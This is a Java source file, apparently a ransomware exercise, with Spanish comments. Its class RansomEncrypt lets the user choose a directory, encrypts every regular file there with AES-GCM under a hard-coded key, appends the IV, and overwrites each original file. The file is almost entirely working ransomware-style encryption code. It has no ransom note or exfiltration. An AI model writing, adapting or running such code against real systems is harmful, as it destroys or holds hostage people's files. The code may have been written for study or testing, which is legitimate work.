package ransom;

import com.sun.xml.internal.ws.util.ByteArrayBuffer;
import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.file.*;
import java.security.*;
import javax.swing.JFileChooser;

public class RansomEncrypt {

    // Define la clave secreta fija  
    private static final String secretKey = "estaesmiclavesecretaparacifrados"; // 32 length
    
    public static void main(String[] args) {
        try {
            // Almacen de IV
            byte[] iv = new byte[12];
            // Usar el directorio indicado para las pruebas y lo muestra
            JFileChooser jfc = new JFileChooser();
            jfc.showOpenDialog(null);
            // Captura el directorio para uso posterior
            File fDir = jfc.getCurrentDirectory();

            // Convierte la clave en un arreglo de bytes
            byte[] keyBytes = secretKey.getBytes();
            // Genera especificaciones de la clave secreta en crudo
            SecretKeySpec spec = new SecretKeySpec(keyBytes, "AES");
            // Navega por cada elemento del directorio
            for (File files : fDir.listFiles()) {
                // Chequeo si no es fichero y no contiene patrones de MacOS
                if (!files.isDirectory() && !files.getName().contains(".DS")) {
                    // Genera un IV aleatorio
                    SecureRandom random = new SecureRandom();
                     // IV de 12 bytes para GCM
                    random.nextBytes(iv);
                    // Inicializa el cifrador en modo GCM
                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                    GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
                    cipher.init(Cipher.ENCRYPT_MODE, spec, parameterSpec);

                    // Leo el fichero a cifrar
                    System.out.println("Leyendo datos: " + files.getAbsolutePath());
                    byte[] fData = Files.readAllBytes(files.toPath());
                    System.out.println("Cifrando: " + files.getAbsolutePath());
                    // Cifra el fichero
                    byte[] encryptedMessage = cipher.doFinal(fData);
                    // Añade el IV al final del mismo
                    ByteBuffer bb = ByteBuffer.allocate(encryptedMessage.length+iv.length);
                    bb.put(encryptedMessage).put(iv);
                    byte[] encryptedMessageWithIV = bb.array();

                    // Sobre-escribe el fichero original con el cifrado
                    String newFilePath = files.toString();
                    System.out.println("Salvando fichero encriptado en: " + newFilePath);
                    Files.write(Paths.get(newFilePath), encryptedMessageWithIV);

                    System.out.println("Mensaje cifrado y IV almacenados con éxito.");
                }
            }
        } catch (NoSuchAlgorithmException | NoSuchPaddingException
                | InvalidKeyException | InvalidAlgorithmParameterException
                | IllegalBlockSizeException | BadPaddingException
                | IOException e) {
            e.printStackTrace();
        }
    }
}
